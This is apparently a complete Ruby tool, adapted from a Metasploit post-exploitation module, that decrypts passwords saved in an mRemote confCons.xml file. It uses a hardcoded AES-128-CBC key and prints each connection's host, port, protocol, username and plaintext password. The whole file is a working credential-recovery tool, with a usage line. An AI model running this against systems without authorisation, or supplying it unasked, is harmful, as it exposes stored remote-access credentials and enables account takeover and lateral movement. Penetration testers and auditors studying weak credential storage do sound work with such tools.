require 'rexml/document'
require 'openssl'
require 'optparse'
include REXML
case ARGV[0]
when "confCons.xml"
	@secret=  "\xc8\xa3\x9d\xe2\xa5\x47\x66\xa0\xda\x87\x5f\x79\xaa\xf1\xaa\x8c"
	xmlfile = File.new(ARGV[0])
	xmldoc = Document.new(xmlfile)
	xmldoc.elements.each("Connections/Node"){|e|
		host = e.attributes['Hostname']
		port = e.attributes['Port']
		proto = e.attributes['Protocol']
		user = e.attributes['Username']
		domain = e.attributes['Domain']
		epassword= e.attributes['Password']
		next if epassword == nil or epassword== ""
		decoded = epassword.unpack("m*")[0]
		iv= decoded.slice!(0,16)
		decipher = OpenSSL::Cipher::AES.new(128, :CBC)
		decipher.decrypt
		decipher.key = @secret
		decipher.iv = iv if iv != nil
		pass = decipher.update(decoded) + decipher.final
		print "HOST:#{host} PORT:#{port} PROTO:#{proto} USER:#{user} PASS:#{pass}\n"
	}
else
  	print "mRemote Offline Password Decrypt.\n"
	print "Based on Metasploit Module enum_mremote_pwds.rb by David Maloney\n"
	print "Author: Adriano Marcio Monteiro\n"
	print "E-mail: adrianomarciomonteiro@gmail.com\n"
	print "Blog: adrianomarciomonteiro.blogspot.com.br\n\n"
	print "Usage: ruby mRemoteOffPwdsDecrypt.rb confCons.xml\n\n"
end
